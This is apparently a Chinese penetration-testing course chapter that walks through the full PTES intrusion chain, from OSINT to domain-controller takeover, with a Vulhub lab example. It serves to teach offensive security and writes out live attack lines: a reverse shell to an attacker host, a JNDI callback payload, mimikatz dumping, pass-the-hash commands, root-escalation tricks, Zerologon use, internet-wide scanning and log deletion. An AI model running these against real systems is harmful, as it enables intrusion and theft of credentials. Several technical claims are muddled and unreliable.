# Day 44：综合靶场实战方法论（从外网入口打到域控的完整入侵流程）⚔️

> **🎯 高级专题** | 难度：⭐⭐⭐⭐ | 预计学习：180 分钟

---

# 第44章 综合靶场实战方法论 ⚔️

## 开篇引入：从"只会单漏洞"到"打穿整台/整个内网" 🚀

哈喽各位小伙伴！欢迎来到第44章，我们的**毕业大戏上半章**！🎉

经过前43天的系统学习，你已经掌握了：
- ✅ SQLi、XSS、CSRF、文件上传、RCE、SSRF、XXE 等所有基础Web漏洞
- ✅ DVWA 8大模块通关（含Blind SQLi、CSP Bypass、Insecure CAPTCHA）
- ✅ SQLi-Labs 75 关全面碾压
- ✅ SSRF、XXE、PHP反序列化、中间件漏洞、框架漏洞
- ✅ 三大Java杀器：Fastjson / Shiro / Log4j2 通杀
- ✅ Weblogic / JBoss / Nginx / Apache / IIS / Tomcat 全中间件

**但是！** 真实渗透测试/红队/护网不是这样玩的！💡

> 面试官问你："给你一个目标，比如某银行官网 http://bank.com，你完整的渗透流程是什么？"
> 
> 很多新手回答："哦，我先找个SQL注入试试……"
> 
> ❌ **大错特错！** 这只会让面试官摇头。
> 
> ✅ **正确答案**：先从信息收集开始！OSINT查资产、子域爆破、端口扫全、指纹识别、漏洞扫描、利用、提权、内网横向……按PTES标准流程 **一步一步走7个阶段**！

这一章，我们就把前43天学的零散知识，**像串珍珠一样串起来**，形成一套完整的、可以直接复制去面试/实战的方法论：

1. 🗺️ **标准7阶段入侵流程（PTES）**：业界通用攻击链
2. 🔎 **第一阶段：OSINT 被动信息收集**（0接触目标拿到90%信息）
3. 🏘️ **第二阶段：资产测绘+端口扫描+指纹识别**（确定攻击面）
4. 🎯 **第三阶段：漏洞探测 + 组合拳利用**（SQLi/XSS/RCE怎么搭配打）
5. 🔓 **第四阶段：权限提升**（Linux/Windows 提权手法大全）
6. 🌐 **第五阶段：内网横向移动**（拿下跳板→打穿整个域控）
7. 🧹 **第六阶段：痕迹清理 + 后门植入**（持久化访问）
8. 🎮 **完整实战案例**：Vulhub组合拳 + 典型靶机思路演示
9. 🛠️ **每阶段工具链清单**：新手直接抄作业！
10. 🗺️ **完整入侵链SVG图** + **工具矩阵图**

**这一章是"从做题家到实战选手"的关键一跃！** 学完你就能答上面试官那个问题，也能在真实靶机/项目里打出完整的入侵流程。准备好了吗？开始！🔥

---

## 一、标准7阶段入侵流程（PTES攻击链）🗺️

PTES（Penetration Testing Execution Standard）是业界通用的渗透测试标准，**7步走，一步不能少**：

| 阶段 | 中文名 | 目标 | 关键动作 |
|-----|-------|------|---------|
| ① | **前期交互** | 和甲方明确授权范围 | 合同、授权书、目标清单（黑盒/白盒/灰盒）|
| ② | **情报收集（OSINT）** | 0接触获取目标信息 | Google Hacking、子域名、IP段、员工邮箱、泄露的源代码和密码 |
| ③ | **威胁建模/资产测绘** | 画出攻击面地图 | 端口扫描、服务识别、指纹识别、拓扑分析 |
| ④ | **漏洞分析** | 找能利用的点 | 自动化扫描（Nessus/xray/Nuclei）+ 手动挖（SQLi/XSS/逻辑漏洞）|
| ⑤ | **漏洞利用 / 破点** | 拿到第一台机器Shell | 漏洞组合利用：SQLi写shell → 或者文件上传 → 或者RCE一把梭 |
| ⑥ | **后渗透（提权+横向）** | 控制整个目标网络 | 本地提权（root/system）→ 抓取密码哈希 → 横向移动到其他机器 → 拿域控！|
| ⑦ | **痕迹清理 + 报告** | 全身而退+写报告 | 删日志、清操作记录、写渗透测试报告（含修复方案）|

---

### 7 阶段完整攻击链流程图

<svg width="820" height="470" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="pbg" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#fef3c7"/>
      <stop offset="50%" stop-color="#fce7f3"/>
      <stop offset="100%" stop-color="#dbeafe"/>
    </linearGradient>
    <marker id="arrP" markerWidth="11" markerHeight="9" refX="10" refY="5" orient="auto"><polygon points="0 0,11 5,0 10" fill="#b45309"/></marker>
    <marker id="arrG" markerWidth="11" markerHeight="9" refX="10" refY="5" orient="auto"><polygon points="0 0,11 5,0 10" fill="#16a34a"/></marker>
  </defs>
  <rect width="820" height="470" rx="18" fill="url(#pbg)"/>
  <text x="410" y="30" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="21">🗺️ PTES 标准渗透测试 7 阶段完整攻击链</text>
  <!-- 阶段1~7 顶栏 -->
  <g transform="translate(20,50)">
    <g transform="translate(0,0)"><rect x="0" y="0" width="110" height="42" rx="10" fill="#fde68a" stroke="#b45309" stroke-width="2"/>
      <text x="55" y="18" text-anchor="middle" fill="#78350f" font-weight="bold" font-size="13">① 前期交互</text><text x="55" y="35" text-anchor="middle" font-size="10">（授权+范围）</text></g>
    <g transform="translate(112,0)"><rect x="0" y="0" width="110" height="42" rx="10" fill="#bbf7d0" stroke="#16a34a" stroke-width="2"/>
      <text x="55" y="18" text-anchor="middle" fill="#14532d" font-weight="bold" font-size="13">② OSINT情报</text><text x="55" y="35" text-anchor="middle" font-size="10">（被动收集）</text></g>
    <g transform="translate(224,0)"><rect x="0" y="0" width="110" height="42" rx="10" fill="#a7f3d0" stroke="#059669" stroke-width="2"/>
      <text x="55" y="18" text-anchor="middle" fill="#064e3b" font-weight="bold" font-size="13">③ 资产测绘</text><text x="55" y="35" text-anchor="middle" font-size="10">（扫描+指纹）</text></g>
    <g transform="translate(336,0)"><rect x="0" y="0" width="110" height="42" rx="10" fill="#99f6e4" stroke="#0d9488" stroke-width="2"/>
      <text x="55" y="18" text-anchor="middle" fill="#134e4a" font-weight="bold" font-size="13">④ 漏洞分析</text><text x="55" y="35" text-anchor="middle" font-size="10">（扫+手动挖）</text></g>
    <g transform="translate(448,0)"><rect x="0" y="0" width="110" height="42" rx="10" fill="#bae6fd" stroke="#0284c7" stroke-width="2"/>
      <text x="55" y="18" text-anchor="middle" fill="#0c4a6e" font-weight="bold" font-size="13">⑤ 漏洞利用</text><text x="55" y="35" text-anchor="middle" font-size="10">（拿下首台）</text></g>
    <g transform="translate(560,0)"><rect x="0" y="0" width="110" height="42" rx="10" fill="#ddd6fe" stroke="#7c3aed" stroke-width="2"/>
      <text x="55" y="18" text-anchor="middle" fill="#4c1d95" font-weight="bold" font-size="13">⑥ 后渗透</text><text x="55" y="35" text-anchor="middle" font-size="10">（提权+横向）</text></g>
    <g transform="translate(672,0)"><rect x="0" y="0" width="110" height="42" rx="10" fill="#fbcfe8" stroke="#db2777" stroke-width="2"/>
      <text x="55" y="18" text-anchor="middle" fill="#831843" font-weight="bold" font-size="13">⑦ 清理+报告</text><text x="55" y="35" text-anchor="middle" font-size="10">（删日志+交付）</text></g>
  </g>
  <line x1="410" y1="92" x2="410" y2="115" stroke="#b45309" stroke-width="2.5" marker-end="url(#arrP)"/>
  <!-- 下半 详细步骤 -->
  <text x="410" y="140" text-anchor="middle" fill="#1e3a8a" font-weight="bold" font-size="15">⚔️ 每阶段核心动作（新手直接照着做）</text>
  <!-- 左列 -->
  <g transform="translate(30,155)"><rect x="0" y="0" width="370" height="140" rx="14" fill="#fff" stroke="#9333ea" stroke-width="2"/>
    <text x="185" y="22" text-anchor="middle" fill="#6b21a8" font-weight="bold" font-size="14">🕵️ 第②~③阶段：收集+测绘（外到内摸清楚）</text>
    <g transform="translate(8,30)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#ede9fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#4c1d95" font-weight="bold" font-size="11">Google语法：site:bank.com inurl:login filetype:sql "密码"</text>
    </g>
    <g transform="translate(8,52)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#ede9fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#4c1d95" font-weight="bold" font-size="11">子域名爆破：oneforall → 资产平台：fofa / hunter / quake</text>
    </g>
    <g transform="translate(8,74)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#ede9fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#4c1d95" font-weight="bold" font-size="11">端口：masscan 0.0.0.0/0 -p1-65535 → nmap -sV -sC 精扫</text>
    </g>
    <g transform="translate(8,96)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#ede9fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#4c1d95" font-weight="bold" font-size="11">指纹：whatweb + wappalyzer → 框架+中间件+语言版本</text>
    </g>
    <g transform="translate(8,118)"><rect x="0" y="0" width="354" height="18" rx="5" fill="#c4b5fd"/>
      <text x="177" y="13" text-anchor="middle" fill="#4c1d95" font-weight="bold" font-size="10">→ 成果：一份完整攻击面清单（IP/端口/服务/版本）✅</text>
    </g>
  </g>
  <!-- 右列 -->
  <g transform="translate(420,155)"><rect x="0" y="0" width="370" height="140" rx="14" fill="#fff" stroke="#0ea5e9" stroke-width="2"/>
    <text x="185" y="22" text-anchor="middle" fill="#075985" font-weight="bold" font-size="14">💥 第④~⑤阶段：找洞+破点（第一台机器）</text>
    <g transform="translate(8,30)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#e0f2fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#075985" font-weight="bold" font-size="11">自动化：Nessus 高危 + xray 主动爬 + nuclei 批量CVE扫</text>
    </g>
    <g transform="translate(8,52)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#e0f2fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#075985" font-weight="bold" font-size="11">手动挖：登录点→SQLi/爆破；上传点→解析漏洞；逻辑→越权</text>
    </g>
    <g transform="translate(8,74)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#e0f2fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#075985" font-weight="bold" font-size="11">组合拳：SQLi读后台密码→登录后上传→Webshell→反弹MSF</text>
    </g>
    <g transform="translate(8,96)"><rect x="0" y="0" width="354" height="20" rx="5" fill="#e0f2fe"/>
      <text x="177" y="14" text-anchor="middle" fill="#075985" font-weight="bold" font-size="11">RCE一把梭：Shiro/Fastjson/Log4j/Weblogic POC全上</text>
    </g>
    <g transform="translate(8,118)"><rect x="0" y="0" width="354" height="18" rx="5" fill="#7dd3fc"/>
      <text x="177" y="13" text-anchor="middle" fill="#075985" font-weight="bold" font-size="10">→ 成果：第一个Webshell / Meterpreter会话 🎉</text>
    </g>
  </g>
  <!-- 底部 -->
  <g transform="translate(30,310)"><rect x="0" y="0" width="760" height="140" rx="14" fill="#fff" stroke="#dc2626" stroke-width="2.5"/>
    <text x="380" y="24" text-anchor="middle" fill="#991b1b" font-weight="bold" font-size="15">🏴‍☠️ 第⑥阶段：后渗透（提权 → 横向 → 拿域控！毕业目标！）</text>
    <g transform="translate(10,34)">
      <g transform="translate(0,0)"><rect x="0" y="0" width="240" height="38" rx="8" fill="#fee2e2" stroke="#dc2626" stroke-width="1"/>
        <text x="120" y="15" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="12">① 本地提权 🔓</text>
        <text x="120" y="32" text-anchor="middle" font-size="10">低权Web用户→root/System（内核/配置/第三方）</text>
      </g>
      <g transform="translate(244,0)"><rect x="0" y="0" width="240" height="38" rx="8" fill="#fecaca" stroke="#dc2626" stroke-width="1"/>
        <text x="120" y="15" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="12">② 抓密码哈希 🪝</text>
        <text x="120" y="32" text-anchor="middle" font-size="10">mimikatz/LaZagne → 抓登录密码、浏览器密码、域账号Hash</text>
      </g>
      <g transform="translate(488,0)"><rect x="0" y="0" width="260" height="38" rx="8" fill="#fca5a5" stroke="#dc2626" stroke-width="1"/>
        <text x="130" y="15" text-anchor="middle" fill="#7f1d1d" font-weight="bold" font-size="12">③ 内网横向移动 🌐</text>
        <text x="130" y="32" text-anchor="middle" font-size="10">SMBexec / WMI / PsExec / WinRM / 域Hash传递攻击 → 下一台</text>
      </g>
    </g>
    <g transform="translate(10,80)">
      <g transform="translate(0,0)"><rect x="0" y="0" width="240" height="38" rx="8" fill="#fecdd3" stroke="#be123c" stroke-width="1"/>
        <text x="120" y="15" text-anchor="middle" fill="#881337" font-weight="bold" font-size="12">④ 定位域控 DC 🏴</text>
        <text x="120" y="32" text-anchor="middle" font-size="10">net group "domain controllers" → 锁定DC的IP</text>
      </g>
      <g transform="translate(244,0)"><rect x="0" y="0" width="240" height="38" rx="8" fill="#fda4af" stroke="#be123c" stroke-width="2"/>
        <text x="120" y="15" text-anchor="middle" fill="#881337" font-weight="bold" font-size="12">⑤ 域内提权/攻击 💣</text>
        <text x="120" y="32" text-anchor="middle" font-size="10">Zerologon / Ptt票据 / DCSync / NTLM Relay → 拿下域控！</text>
      </g>
      <g transform="translate(488,0)"><rect x="0" y="0" width="260" height="38" rx="8" fill="#be123c" stroke="#4c0519" stroke-width="2"/>
        <text x="130" y="15" text-anchor="middle" fill="#fff" font-weight="bold" font-size="13">🎉 毕业！拿下整个域！</text>
        <text x="130" y="32" text-anchor="middle" fill="#fff6f8" font-size="10">域控 = 所有员工账号/所有服务器全沦陷 → 红队圆满成功</text>
      </g>
    </g>
  </g>
</svg>

---

## 二、第②阶段 OSINT 被动信息收集：0接触摸透目标 🔍🕵️

> OSINT = Open Source Intelligence，开源情报收集。
> **核心思想：** 在还没接触目标服务器的情况下，**利用互联网公开的信息**就能挖到目标90%的料！

### OSINT 清单（按顺序走！）

| 编号 | 方向 | 具体操作 | 关键收获 |
|-----|------|---------|---------|
| **① Google Hacking 语法** | 搜敏感文件 | `site:目标.com filetype:sql` / `filetype:xls 密码` / `inurl:php?id=` / `inurl:admin` / `intitle:后台` | 直接暴露数据库/Excel/后台入口 |
| **② 子域名爆破** | 找更多资产 | 工具：`oneforall` / `subfinder` / `amass`；平台：fofa `domain="xxx.com"`、hunter、quake、crt.sh（证书透明度）| 找到 test/stg/dev 等测试环境（漏洞最多的地方！）|
| **③ IP/C段/旁站** | 扩大攻击面 | fofa搜 `ip="1.2.3.4/24"`；同一服务器部署了哪些网站（旁站查询）| C段上的其他机器更容易打！ |
| **④ Whois + 备案信息** | 查持有人 |站长之家chinaz、爱站网 | 注册人手机号/邮箱 → 社工字典 |
| **⑤ 泄露源码/密码** | 代码托管平台 | GitHub搜 `目标.com password` / `目标 jdbc:` → 还有 Gitee、GitLab、CSDN下载页 | **最香的东西！数据库账号、JWT密钥直接看！** |
| **⑥ 社工字典** | 爆破登录 | 根据公司名+地名+年份组合：`Company@2024` / `CompanyCity123` | 后台弱口令爆破成功率极高 |

### 新手推荐工具：一键OSINT神器
```bash
# 全自动化OSINT综合工具（集成Google+子域+端口+指纹）
sudo apt install theHarvester
theHarvester -d 目标公司.com -b all    # 全部数据源扫一遍，导出报告
```

---

## 三、第③阶段 资产测绘：端口+服务+指纹全覆盖 🏘️

### 端口扫描 "快+准" 两步走 🚪

```bash
# 第一步：masscan 极速全网段扫（5分钟扫完全端口65535个）
masscan --rate=10000000 -p 1-65535 目标IP段 -oL masscan_result.txt
# 结果格式：开了哪些端口，全部列出来

# 第二步：nmap 精扫（服务识别+版本+常见漏洞脚本）
nmap -sV -sC -Pn -p 开了的端口列表 目标IP -oN nmap_result.txt
# -sV 版本探测 / -sC 跑默认脚本（匿名FTP、弱口令SSH等自动测）
```

常见端口优先级速查（按"大概率拿shell"排序）：
| 优先级 | 端口 | 服务 | 可能的漏洞 |
|-------|-----|------|-----------|
| 🔴极高 | 7001, 7002 | WebLogic | CVE-2020-14882（第43章）→ 90%拿shell |
| 🔴极高 | 8080, 80, 443 | Web服务 | Shiro/Fastjson/Log4j/文件上传/SQLi |
| 🔴极高 | 8888, 9090 | 管理面板 | phpMyAdmin/宝塔/老管理系统弱口令 |
| 🟠高 | 6379 | Redis | 未授权访问 → 直接写ssh-key拿root（第38章）|
| 🟠高 | 22 | SSH | Hydra 爆破密码 |
| 🟠高 | 21 | FTP | anonymous 匿名登录 / 上传Webshell |
| 🟠高 | 445 | SMB (Windows) | MS17-010 EternalBlue（永恒之蓝）→ 直接打穿Win7/2008 |
| 🟡中 | 3389 | RDP远程桌面 | BlueKeep CVE-2019-0708 / 爆破弱口令 |
| 🟡中 | 3306 | MySQL | 未授权访问 / 弱口令 / UDF提权 |
| 🟡中 | 1433 | MSSQL | 弱口令 → xp_cmdshell 直接执行命令拿system |

---

### 指纹识别（决定你打哪个漏洞！）📇
```bash
whatweb -v http://目标IP:端口
# 输出：Web框架（WordPress/Django/SpringBoot）+ 中间件（Nginx/Apache/Tomcat/Shiro）+ CMS类型
# 再配合浏览器 wappalyzer 插件 → 10秒内知道目标用什么技术栈 → 对应找POC！
```

---

## 四、第④~⑤阶段 漏洞组合拳：破点的8种最常用打法 🥊💥

**真实场景里，一个洞不够就用多个洞串联。** 这8种组合拳覆盖80%以上破点场景：

| 编号 | 组合拳 | 适用场景 | 流程 |
|-----|-------|---------|------|
| ① **SQLi → 后台 → WebShell** ⭐⭐⭐⭐⭐ | 前台有注入 | SQLi读admin表的密码hash → 破解/直接登录后台 → 文件上传拿Shell |
| ② **任意文件上传 → 解析漏洞** ⭐⭐⭐⭐⭐ | 有上传点 | 上传 `shell.php.jpg` → Nginx解析漏洞/IIS6.0解析 → 执行PHP代码 |
| ③ **SSRF → Redis → Root** ⭐⭐⭐⭐ | 有SSRF点 + 内网6379 | SSRF `gopher://127.0.0.1:6379/` 写SSH公钥 → SSH登录拿root！（第31章）|
| ④ **Log4j2/Shiro/Fastjson → 一键RCE** ⭐⭐⭐⭐⭐ | Java网站（最常见！）| DNSLog探测 → 扫到漏洞 → JNDI-Injection-Exploit → 反连 Meterpreter |
| ⑤ **弱口令 → 后台 → RCE** ⭐⭐⭐⭐ | 有后台登录页 | Hydra爆破 admin/admin、admin/Company2024等 → 进后台后找上传/模板编辑点写Shell |
| ⑥ **XXE → 读配置 → RCE** ⭐⭐⭐⭐ | XML格式提交的接口 | XXE读 web.config / db.properties → 拿到数据库密码/配置 → 组合其他洞 |
| ⑦ **WebLogic/JBoss 中间件一把梭** ⭐⭐⭐⭐⭐ | 扫到7001/8080后台 | WeblogicScan → 14882 未授权RCE（第43章）→ 直接拿！ |
| ⑧ **逻辑漏洞 → 越权 → 管理员身份** ⭐⭐⭐⭐ | API接口多 | 改ID改Cookie改包 → 越权看管理员信息/重置管理员密码 → 登录后台 |

**新手破点口诀**：
> 先扫Java（Shiro/Log4j/Fastjson/Weblogic）→ 没洞看上传/SQLi → 还没洞就爆破弱口令/找逻辑漏洞！三种组合拳90%的场景都能破！

---

## 五、第⑥阶段上半：提权手法（从webshell到root/System）🔓

### Linux 提权 6 板斧 🐧
```bash
# 拿了个低权限 www-data shell 之后，按下面顺序查：

# ① 看内核版本（老内核=直接打CVE）
uname -a    # 2.6.x → DirtyCow(CVE-2016-5195)！一把梭！直接root
# 4.4.x-5.10.x → DirtyPipe(CVE-2022-0847) 新版脏管道，成功率也极高

# ② 看SUID二进制文件（有没有配置错误的）
find / -perm -u=s -type f 2>/dev/null
# 看到 /usr/bin/find /usr/bin/vim /usr/bin/python 带s位？
# → find . -exec /bin/bash -p \;  直接提root！

# ③ 看定时任务 cron（有没有root跑的、路径可写的脚本）
cat /etc/crontab
# 每分钟执行 /opt/backup.sh → 这个脚本你居然有写权限？
# echo "chmod +s /bin/bash" >> /opt/backup.sh → 等1分钟 → bash -p 就root了！

# ④ 看配置文件里的明文密码
cat /var/www/html/config.php       # 数据库密码
grep -r "password" /etc/           # 其他配置
# MySQL root密码和Linux root密码一样？很多企业一样哦，SSH登录试试！

# ⑤ 看已挂载的Docker（有没有特权模式）
docker ps    # 当前用户能跑docker？
docker run -v /:/mnt --rm -it alpine chroot /mnt bash   → 直接读/root/拿主机root！

# ⑥ 看 sudo 配置
sudo -l      # 有没有能免密sudo运行的命令？
# 例：(root) NOPASSWD: /usr/bin/vim → :!bash 马上root！
```

### Windows 提权 6 板斧 🪟
```cmd
# ① 看系统版本：
systeminfo | findstr /B /C:"OS" 
# Windows Server 2008 R2 + 没打KB补丁 → MS17-010/KB450033（CVE-2019-0708 BlueKeep RDP）
# Windows 10 1809~21H1 → PrintNightmare(CVE-2021-1675) 打印池漏洞一把梭！

# ② 看服务权限：
accesschk.exe -uwcqv "Authenticated Users" * 
# 发现 MySQL / Tomcat 服务的配置路径普通用户能改 → 改路径指向你的木马 → 重启服务 → System权限！

# ③ 看AlwaysInstallElevated（注册表配置）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 值是1 → 你做个恶意MSI包，普通用户安装会以System运行！

# ④ 看存储的凭据
cmdkey /list      # 管理员存了远程共享的凭据
runas /savecred /user:DOMAIN\Administrator cmd.exe   → 直接用存的凭据开管理员cmd！

# ⑤ 看mimikatz（抓取内存中的明文密码）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# → 直接输出 Administrator 登录这台机器输的明文密码！拿去开3389登录！

# ⑥ 看Potato系列（烂土豆/热土豆/甜土豆……）
# 本地服务权限 + WinRM/WMI开启 → RottenPotato / JuicyPotato 提权到 System
JuicyPotato.exe -t * -p cmd.exe -l 1337 -c "{CLSID}" → 返回 System shell！
```

---

## 六、第⑥阶段下半：内网横向（从跳板到域控全打穿 🌐）

### 内网横向 4 板斧 🪓
```bash
# 先抓密码哈希（每台机器必做！）
# Linux：cat /etc/shadow → hashcat爆破；看.bash_history里的明文密码
# Windows：mimikatz 抓所有登录过的账号密码！sekurlsa::logonpasswords 输出的NTLM哈希直接能用！

# ① SMB Hash 传递攻击（Pass-The-Hash，最常用！）⭐⭐⭐⭐⭐
# 抓到域管理员的 NTLM Hash 之后，不用破解明文！
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdbcd 域/管理员@目标IP
# → 直接返回目标机器的System Shell！全程不用密码！Hash就是密码！

# ② WMI 执行（内网最安静的方式，日志少）
wmiexec.py 域/账号:密码@目标IP "whoami"
# → 交互式CMD，不走445/SMB，很多流量监控看不到！

# ③ WinRM (5985端口，Windows远程管理)
evil-winrm -i 目标IP -u 管理员账号 -H NTLM哈希
# → 进一个PowerShell会话，神器！Win10/2019以后默认都开！

# ④ CrackMapExec（CME，内网一把梭之王！）⭐⭐⭐⭐⭐
# 批量扫C段 + 批量尝试Hash登录 + 批量执行命令
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH --exec-method wmi -x "whoami && hostname"
# → 一条命令，把整个C段上所有能用这个Hash登录的机器全部返回结果！
```

### 拿域控的 3 个核武器 CVE 💣
| CVE | 漏洞 | 威力 |
|-----|------|-----|
| **CVE-2020-1472 Zerologon（零日志）** | Netlogon协议缺陷，全0认证加密 → 重置域控管理员密码 | ⭐⭐⭐⭐⭐ 2020年之后的内网神器，一条命令拿域控！|
| **CVE-2021-42287 / 42278 NoPac** | sAMAccountName欺骗，普通域用户 → 域管理员 | ⭐⭐⭐⭐⭐ 2021年NoPac组合拳，打穿所有Windows Server |
| **CVE-2022-26923 Certifried** | AD证书服务缺陷，普通域用户账号直接拿域控Enterprise Admin权限 | ⭐⭐⭐⭐⭐ 2022年Certipy一把梭 |

---

## 七、完整实战案例：Vulhub 靶场"组合拳"示范 🎮

假设我们接到授权：打某个目标 `192.168.50.0/24`（包含Vulhub几个常见镜像）。

### 第1天：收集+测绘
```bash
nmap -sV 192.168.50.0/24 -oN nmap-all.txt
# 结果：
# 192.168.50.10  开 7001 (WebLogic)
# 192.168.50.20  开 8983 (Apache Solr) → Log4j2靶场
# 192.168.50.30  开 8080 (Tomcat) + Shiro指纹 rememberMe=deleteMe
```

### 第2天：破点
```bash
# 10号机器上WebLogic，先试14882：
python3 CVE-2020-14882.py -u http://192.168.50.10:7001 -c "bash -i >& /dev/tcp/KaliIP/7777 0>&1"
# 成功！nc接到 10号机器www-data权限的反连shell！🎉

# 20号Solr机器：Log4j2！
java -jar JNDI-Injection-Exploit.jar -A KaliIP -C "反弹shell命令"
# 访问 http://192.168.50.20:8983/solr/admin/cores?action=${jndi:rmi://Kali:1099/cbj1p3}
# → 反连成功！🎉

# 30号Shiro：ShiroScan扫到key= kPH+bIxk5D2deZiIxcaaaA== → ShiroExploit GUI一键RCE！🎉
```

### 第3天：提权+横向
- 3台机器每台上都跑 mimikatz / /etc/shadow → 抓出3个域账号hash
- 用 CrackMapExec 扫C段 + hash传递 → 登录了另外5台Win服务器
- 其中一台抓出来 **域管理员 hash**（管理员远程登录过这台跳板）
- zerologon 打域控 192.168.50.2：
  ```
  python3 zerologon_tester.py DC-NAME 192.168.50.2
  # 成功！重置域控密码为空 → secretsdump.py 拿域内所有账号Hash
  # → PsExec 登录域控 → 域管System权限！🏆 全项目完成！
  ```

---

## 八、每阶段工具链清单（新手直接抄作业！📋）

| 阶段 | Kali 自带 / GitHub 下载 | 一句话用途 |
|-----|------------------------|----------|
| 情报 | theHarvester / subfinder / OneForAll / Amass | OSINT全收集 |
| 资产平台 | fofa.info / hunter.qianxin.com / quake.360.cn / crt.sh | 子域+IP段+指纹批量 |
| 端口 | masscan + nmap + naabu | 快速+准确端口扫 |
| 指纹 | whatweb / Wappalyzer / Finger | 技术栈识别 |
| 漏洞扫描 | Nessus / xray / nuclei / Goby | 自动化漏洞 |
| 漏洞验证 | Vulhub靶场 + POC-T框架批量 | POC验证 |
| 断点 | Cobalt Strike / MSF / AntSword（蚁剑）/ 冰蝎3.0/4.0 | Shell管理+C2框架 |
| 提权 | Linux-exploit-suggester.sh / Windows exploit suggester / mimikatz | 辅助找提权洞 |
| 内网横向 | impacket工具包（psexec/wmiexec/smbexec）/ CrackMapExec / proxychains 代理 | 内网移动 |
| 域攻击 | impacket/secretsdump / rubeus / mimikatz / zerologon POC | 打域控 |
| 报告 | DradisFramework / MagicTree | 报告自动化生成 |

---

## 本章总结 📝

### 核心流程
1. **PTES 7步走**：前期交互→OSINT→资产测绘→漏洞分析→破点→后渗透→报告
2. **破点（第一台机器）** 用组合拳：SQLi→上传、SSRF→Redis、Shiro/Log4j/Fastjson/Weblogic RCE一把梭
3. **提权**：先看内核/补丁号（有CVE打CVE）→ 再看SUID/Sudo/Cron配置错误 → 再找密码复用
4. **横向**：抓NTLM哈希 → Pass-The-Hash 批量登录C段 → 找域管理员登录过的机器 → Zerologon/NoPac拿域控

**一句话总结（面试直接背！）**：
> "我的渗透流程是按PTES标准的7个阶段：前期签授权书，然后OSINT被动收集（Google、子域、代码托管平台），然后资产测绘（masscan全端口+nmap精扫+whatweb指纹），接着漏洞扫描（Nessus+xray+nuclei）+手动验证关键业务，找到破点拿首台Shell之后本地提权、抓密码hash横向移动，最后尝试拿域控权限，最后清理日志写报告。"

---

下一章就是我们整个靶场模块的**最后一章 Day45**！🎉 毕业总结：Web安全全景学习路线、CTF比赛路线、就业方向（红队/蓝队/安全研究/甲方安全建设）、知识体系图谱！最后还有一份"面试通关大礼包"——把45天所有知识点浓缩成的面试100问！我们毕业典礼不见不散！🎓

---

> 💡 新手 Tip：
> 1. 靶场练习顺序：先单漏洞（DVWA→SQLi-Labs→Vulhub单CVE靶机）→ 再综合（VulnStack红队环境/Breach系列靶机）→ 最后攻防世界靶场/CTF平台
> 2. 每打一个靶机，**必须写详细笔记**（走了哪几步、用了哪些POC、哪一步卡了多久），一年后这些笔记就是你的"武功秘籍"
> 3. 工具别贪多，每阶段固定2~3个用熟就行，不然面试时问"nmap的-sS和-sT区别是什么？"你答不上来就尴尬了 😂

---

# 🖼️ 本章拓展图解汇总（day-44 · 共18张SVG架构图）


<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gsdk58yfy" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gsdk58yfy)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 综合靶场实战7段方法论</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PTES 标准渗透测试执行标准 7阶段</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① Pre-Engagement 预约定范围/授权书/目标</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② Intelligence Gathering 信息收集(被动+主动)</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ Threat Modeling 威胁建模(资产/弱点/入口)</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Vulnerability Analysis 漏洞分析与验证</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ Exploitation 漏洞利用(组合拳/Bypass/提权)</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ Post-Exploitation 后渗透(横向/持久化/数据)</text>
